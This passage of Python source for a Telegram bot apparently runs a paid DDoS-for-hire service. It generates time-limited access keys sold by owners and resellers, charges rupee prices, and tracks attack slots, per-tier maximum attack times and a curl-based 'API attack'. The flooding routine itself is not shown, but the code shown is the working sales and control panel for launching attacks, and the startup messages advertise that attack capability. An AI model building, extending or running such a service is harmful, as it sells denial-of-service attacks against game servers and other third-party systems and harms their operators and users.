        parse_mode="HTML"
    )

@bot.callback_query_handler(func=lambda call: call.data.startswith("duration_"))
def duration_callback(call):
    bot.answer_callback_query(call.id)
    user_id = call.from_user.id
    
    if user_id not in temp_key_gen:
        bot.send_message(call.message.chat.id, f"{pe('cross','❌')} Pʟᴇᴀꜱᴇ ᴜꜱᴇ /gen ꜰɪʀꜱᴛ!", parse_mode="HTML")
        return
        
    duration_key = call.data.replace("duration_", "")
    temp_key_gen[user_id]['duration'] = duration_key
    
    bot.edit_message_text(
        f"{pe('check','✅')} Dᴜʀᴀᴛɪᴏɴ ꜱᴇʟᴇᴄᴛᴇᴅ: <b>{DURATION_LABELS.get(duration_key, duration_key)}</b>\n\n"
        f"{pe('pencil','📝')} Nᴏᴡ ꜱᴇɴᴅ ᴛʜᴇ ᴘʀᴇꜰɪx ᴀɴᴅ ᴄᴏᴜɴᴛ:\n"
        f"Fᴏʀᴍᴀᴛ: <code><ᴘʀᴇꜰɪx> <ᴄᴏᴜɴᴛ></code>\n\n"
        f"Exᴀᴍᴘʟᴇ: <code>BGMI 5</code>\n\n"
        f"Mᴀx ᴄᴏᴜɴᴛ: 50 ꜰᴏʀ ᴏᴡɴᴇʀ, 20 ꜰᴏʀ ʀᴇꜱᴇʟʟᴇʀ\n\n"
        f"Tʏᴘᴇ /cancel ᴛᴏ ᴀʙᴏʀᴛ.",
        call.message.chat.id,
        call.message.message_id,
        parse_mode="HTML"
    )
    bot.register_next_step_handler(call.message, process_key_gen_with_duration)

def process_key_gen_with_duration(message):
    user_id = message.from_user.id
    
    if message.text == "/cancel":
        if user_id in temp_key_gen:
            del temp_key_gen[user_id]
        bot.reply_to(message, f"{pe('cross','❌')} Oᴘᴇʀᴀᴛɪᴏɴ ᴄᴀɴᴄᴇʟʟᴇᴅ!", parse_mode="HTML")
        return
        
    if user_id not in temp_key_gen:
        bot.reply_to(message, f"{pe('cross','❌')} Pʟᴇᴀꜱᴇ ᴜꜱᴇ /gen ᴄᴏᴍᴍᴀɴᴅ ꜰɪʀꜱᴛ!", parse_mode="HTML")
        return
        
    key_type = temp_key_gen[user_id]['key_type']
    duration_key = temp_key_gen[user_id]['duration']
    del temp_key_gen[user_id]
    
    command_parts = message.text.split()
    if len(command_parts) != 2:
        bot.reply_to(message, f"{pe('warning','⚠️')} Usᴀɢᴇ: <code><ᴘʀᴇꜰɪx> <ᴄᴏᴜɴᴛ></code>\n\nExᴀᴍᴘʟᴇ: <code>BGMI 5</code>", parse_mode="HTML")
        return
        
    prefix = command_parts[0].upper()
    
    try:
        count = int(command_parts[1])
        max_count = 50 if is_owner(user_id) else 20
        if count < 1 or count > max_count:
            bot.reply_to(message, f"{pe('cross','❌')} Cᴏᴜɴᴛ ᴍᴜꜱᴛ ʙᴇ ʙᴇᴛᴡᴇᴇɴ 1-{max_count}!", parse_mode="HTML")
            return
    except:
        bot.reply_to(message, f"{pe('cross','❌')} Iɴᴠᴀʟɪᴅ ᴄᴏᴜɴᴛ!", parse_mode="HTML")
        return
        
    duration_seconds = DURATION_SECONDS[duration_key]
    duration_label = DURATION_LABELS[duration_key]
    reseller = get_reseller(user_id)
    
    price_per_key = get_key_price(key_type, duration_key)
    max_attack_time = get_key_max_attack(key_type)
    total_price = price_per_key * count
    
    if price_per_key == 0:
        bot.reply_to(message, f"{pe('cross','❌')} Iɴᴠᴀʟɪᴅ ᴅᴜʀᴀᴛɪᴏɴ ꜰᴏʀ {key_type} ᴋᴇʏꜱ!", parse_mode="HTML")
        return
        
    if is_owner(user_id):
        generated_keys = []
        for _ in range(count):
            key = generate_key(prefix, 12)
            key_doc = {
                'key': key,
                'duration_seconds': duration_seconds,
                'duration_label': duration_label,
                'created_at': datetime.now(),
                'created_by': user_id,
                'created_by_type': 'owner',
                'used': False,
                'used_by': None,
                'used_at': None,
                'max_users': 1,
                'key_type': key_type,
                'max_attack_time': max_attack_time
            }
            keys_collection.insert_one(key_doc)
            generated_keys.append(key)
            
        if count == 1:
            bot.reply_to(message, f"{pe('check','✅')} {key_type} Kᴇʏ Gᴇɴᴇʀᴀᴛᴇᴅ!\n\n{pe('lock','🔑')} Kᴇʏ: <code>{generated_keys[0]}</code>\n{pe('timer','⏰')} Dᴜʀᴀᴛɪᴏɴ: {duration_label}\n{pe('lightning','⚡')} Mᴀx Aᴛᴛᴀᴄᴋ: {max_attack_time}ꜱ\n{pe('money','💰')} Pʀɪᴄᴇ: {price_per_key} Rꜱ", parse_mode="HTML")
        else:
            keys_text = "\n".join([f"★ <code>{k}</code>" for k in generated_keys])
            bot.reply_to(message, f"{pe('check','✅')} {count} {key_type} Kᴇʏꜱ Gᴇɴᴇʀᴀᴛᴇᴅ!\n\n{pe('lock','🔑')} Kᴇʏꜱ:\n{keys_text}\n\n{pe('timer','⏰')} Dᴜʀᴀᴛɪᴏɴ: {duration_label}\n{pe('lightning','⚡')} Mᴀx Aᴛᴛᴀᴄᴋ: {max_attack_time}ꜱ\n{pe('money','💰')} Tᴏᴛᴀʟ Pʀɪᴄᴇ: {total_price} Rꜱ", parse_mode="HTML")
    
    elif reseller:
        balance = reseller.get('balance', 0)
        
        if balance < total_price:
            bot.reply_to(message, f"{pe('cross','❌')} Iɴꜱᴜꜰꜰɪᴄɪᴇɴᴛ ʙᴀʟᴀɴᴄᴇ!\n\n{pe('money','💵')} RᴇQᴜɪʀᴇᴅ: {total_price} Rꜱ ({count} x {price_per_key})\n{pe('money','💰')} Yᴏᴜʀ Bᴀʟᴀɴᴄᴇ: {balance} Rꜱ\n\nAᴅᴅ ʙᴀʟᴀɴᴄᴇ ꜰʀᴏᴍ ᴏᴡɴᴇʀ!", parse_mode="HTML")
            return
            
        username = message.from_user.username or str(user_id)
        generated_keys = []
        
        for _ in range(count):
            key = f"{username}-{generate_key(username, 8)}"
            key_doc = {
                'key': key,
                'duration_seconds': duration_seconds,
                'duration_label': duration_label,
                'created_at': datetime.now(),
                'created_by': user_id,
                'created_by_username': username,
                'created_by_type': 'reseller',
                'used': False,
                'used_by': None,
                'used_at': None,
                'max_users': 1,
                'key_type': key_type,
                'max_attack_time': max_attack_time
            }
            keys_collection.insert_one(key_doc)
            generated_keys.append(key)
            
        new_balance = balance - total_price
        resellers_collection.update_one(
            {'user_id': user_id},
            {'$set': {'balance': new_balance}, '$inc': {'total_keys_generated': count}}
        )
        
        try:
            keys_list_str = "\n".join([f"{k}" for k in generated_keys])
            owner_msg = (
                f"{pe('bell','🔔')} Rᴇꜱᴇʟʟᴇʀ Kᴇʏ Gᴇɴᴇʀᴀᴛɪᴏɴ Nᴏᴛɪꜰɪᴄᴀᴛɪᴏɴ\n\n"
                f"{pe('profile','👤')} Rᴇꜱᴇʟʟᴇʀ: {username} ({user_id})\n"
                f"{pe('lock','🔑')} Kᴇʏꜱ Gᴇɴᴇʀᴀᴛᴇᴅ: {count}\n"
                f"{pe('star','⭐')} Kᴇʏ Tʏᴘᴇ: {key_type}\n"
                f"{pe('timer','⏰')} Dᴜʀᴀᴛɪᴏɴ: {duration_label}\n"
                f"{pe('money','💵')} Pʀɪᴄᴇ ᴘᴇʀ Kᴇʏ: {price_per_key} Rꜱ\n"
                f"{pe('money','💵')} Tᴏᴛᴀʟ Cᴏꜱᴛ: {total_price} Rꜱ\n"
                f"{pe('money','💰')} Rᴇᴍᴀɪɴɪɴɢ Bᴀʟᴀɴᴄᴇ: {new_balance} Rꜱ\n\n"
                f"{pe('word','📜')} Kᴇʏꜱ:\n{keys_list_str}"
            )
            for owner in BOT_OWNER:
                bot.send_message(owner, owner_msg, parse_mode="HTML")
        except Exception as e:
            print(f"Fᴀɪʟᴇᴅ ᴛᴏ ɴᴏᴛɪꜰʏ ᴏᴡɴᴇʀ: {e}")
            
        if count == 1:
            bot.reply_to(message, f"{pe('check','✅')} {key_type} Kᴇʏ Gᴇɴᴇʀᴀᴛᴇᴅ!\n\n{pe('lock','🔑')} Kᴇʏ: <code>{generated_keys[0]}</code>\n{pe('timer','⏰')} Dᴜʀᴀᴛɪᴏɴ: {duration_label}\n{pe('money','💰')} Bᴀʟᴀɴᴄᴇ: {new_balance} Rꜱ\n{pe('lightning','⚡')} Mᴀx Aᴛᴛᴀᴄᴋ: {max_attack_time}ꜱ", parse_mode="HTML")
        else:
            keys_text = "\n".join([f"★ <code>{k}</code>" for k in generated_keys])
            bot.reply_to(message, f"{pe('check','✅')} {count} {key_type} Kᴇʏꜱ Gᴇɴᴇʀᴀᴛᴇᴅ!\n\n{pe('lock','🔑')} Kᴇʏꜱ:\n{keys_text}\n\n{pe('timer','⏰')} Dᴜʀᴀᴛɪᴏɴ: {duration_label}\n{pe('money','💵')} Cᴏꜱᴛ: {total_price} Rꜱ\n{pe('money','💰')} Bᴀʟᴀɴᴄᴇ: {new_balance} Rꜱ\n{pe('lightning','⚡')} Mᴀx Aᴛᴛᴀᴄᴋ: {max_attack_time}ꜱ", parse_mode="HTML")

@bot.message_handler(commands=["id"])
def id_command(message):
    if check_banned(message): return
    user_id = message.from_user.id
    safe_send_message(message.chat.id, f"{pe('profile','🆔')} Yᴏᴜʀ ɪᴅ: <code>{user_id}</code>", reply_to=message, parse_mode="HTML")

@bot.message_handler(commands=["ping"])
def ping_command(message):
    start_time = datetime.now()
    
    total_users = users_collection.count_documents({})
    maintenance_status = "✅ Dɪꜱᴀʙʟᴇᴅ" if not is_maintenance() else "🔴 Eɴᴀʙʟᴇᴅ"
    
    uptime_seconds = (datetime.now() - bot_start_time).total_seconds()
    hours = int(uptime_seconds // 3600)
    minutes = int((uptime_seconds % 3600) // 60)
    seconds = int(uptime_seconds % 60)
    uptime_str = f"{hours}h {minutes:02d}m {seconds:02d}s"
    
    response_time = int((datetime.now() - start_time).total_seconds() * 1000)
    
    busy_slots, free_slots, total_slots = get_slot_status()
    active_groups = approved_groups_collection.count_documents({})
    private_users = bot_users_collection.count_documents({})
    blocked_ips_count = len(get_all_blocked_ips())
    
    # Yahan parse_mode="HTML" ki jagah parse_mode="Markdown" kar de
    response = f"🏓 Bᴏᴛ Pᴏɴɢ!\n\n"
    response += f"★ Rᴇꜱᴘᴏɴꜱᴇ Tɪᴍᴇ: {response_time}ms\n"
    response += f"★ Aᴄᴛɪᴠᴇ Aᴛᴛᴀᴄᴋꜱ: {busy_slots}/{total_slots}\n"
    response += f"★ Aᴄᴛɪᴠᴇ Gʀᴏᴜᴘꜱ: {active_groups}\n"
    response += f"★ Pʀɪᴠᴀᴛᴇ Usᴇʀꜱ: {private_users}\n"
    response += f"★ Bʟᴏᴄᴋᴇᴅ IPꜱ: {blocked_ips_count}\n"
    response += f"★ Mᴀɪɴᴛᴇɴᴀɴᴄᴇ Mᴏᴅᴇ: {maintenance_status}\n"
    response += f"★ Uᴘᴛɪᴍᴇ: {uptime_str}"
    
    # Yahan Markdown kiya hai
    safe_send_message(message.chat.id, response, reply_to=message, parse_mode="Markdown")

print("=" * 60)
print("🤖 ʙᴏᴛ ꜱᴛᴀʀᴛɪɴɢ ᴡɪᴛʜ ᴀʟʟ ꜰᴇᴀᴛᴜʀᴇꜱ")
print("=" * 60)
print(f"👑 Oᴡɴᴇʀ IDꜱ: {BOT_OWNER}")
print(f"🎯 Mᴀx Sɪᴍᴜʟᴛᴀɴᴇᴏᴜꜱ Sʟᴏᴛꜱ: {current_max_slots}")
print(f"⚡ Cᴏɴᴄᴜʀʀᴇɴᴛ Pᴇʀ Aᴛᴛᴀᴄᴋ: {get_concurrent_limit()}")
print(f"⏱️ Mᴀx Aᴛᴛᴀᴄᴋ Tɪᴍᴇ (Nᴏʀᴍᴀʟ): {get_max_attack_time()}ꜱ")
print(f"⭐ VIP Mᴀx Aᴛᴛᴀᴄᴋ Tɪᴍᴇ: {get_key_max_attack('VIP')}ꜱ")
print(f"📀 NORMAL Mᴀx Aᴛᴛᴀᴄᴋ Tɪᴍᴇ: {get_key_max_attack('NORMAL')}ꜱ")
print(f"⏳ Cᴏᴏʟᴅᴏᴡɴ: {get_user_cooldown_setting()}ꜱ")
print(f"🚫 IP Bʟᴏᴄᴋɪɴɢ: Aᴄᴛɪᴠᴇ (ꜱᴜᴘᴘᴏʀᴛꜱ ᴘᴀʀᴛɪᴀʟ ᴍᴀᴛᴄʜɪɴɢ)")
print("=" * 60)
print("✅ Aʟʟ ᴄᴏᴍᴍᴀɴᴅꜱ ᴡᴏʀᴋɪɴɢ")
print("✅ API ᴀᴛᴛᴀᴄᴋ ᴜꜱɪɴɢ ᴄᴜʀʟ ᴡɪᴛʜ HTTP/1.1")
print("✅ ꜱᴛᴀᴛᴜꜱ ꜱʜᴏᴡꜱ ᴀʟʟ ᴀᴄᴛɪᴠᴇ ᴀᴛᴛᴀᴄᴋꜱ ᴡɪᴛʜ ᴘʀᴏɢʀᴇꜱꜱ ʙᴀʀ")
print("✅ Nᴏɴ-ʙʟᴏᴄᴋɪɴɢ ᴀᴛᴛᴀᴄᴋꜱ - ʙᴏᴛ ʀᴇꜱᴘᴏɴꜱɪᴠᴇ")
print("✅ Pᴏʀᴛ ᴘʀᴏᴛᴇᴄᴛɪᴏɴ: ꜱᴀᴍᴇ ᴘᴏʀᴛ ᴄᴀɴɴᴏᴛ ʙᴇ ᴀᴛᴛᴀᴄᴋᴇᴅ ᴡʜɪʟᴇ ᴀᴄᴛɪᴠᴇ")
print("✅ OWNER CAN ATTACK WITHOUT KEY - NO REDEEM NEEDED")
print("✅ Kᴇʏ Dᴜʀᴀᴛɪᴏɴꜱ: 1ᴅ ᴛᴏ 30ᴅ + 2ʜ,6ʜ,12ʜ")
print("✅ /apihealth - Cʜᴇᴄᴋ API ꜱᴛᴀᴛᴜꜱ (API ᴋᴇʏ ᴄᴏᴍᴘʟᴇᴛᴇʟʏ ʜɪᴅᴅᴇɴ)")
print("✅ /allkeys - Cᴏᴍᴘʟᴇᴛᴇ ᴋᴇʏꜱ ᴅᴇᴛᴀɪʟꜱ ᴡɪᴛʜ ᴇᴠᴇʀʏᴛʜɪɴɢ")
print("✅ /status - Live updating progress bar from voltage.py")
print("✅ /gen and /config keep their own inline keyboards")

if __name__ == "__main__":
    print("🚀 Bot Started...")
    while True:
        try:
            # Ye line purane messages ko skip karegi jisse 'int' wala error nahi aayega
            bot.infinity_polling(timeout=20, long_polling_timeout=20, skip_pending=True)
        except Exception as e:
            print(f"⛔ Polling error: {e}")
            print("🔄 Restarting bot in 5 seconds...")
            time.sleep(5)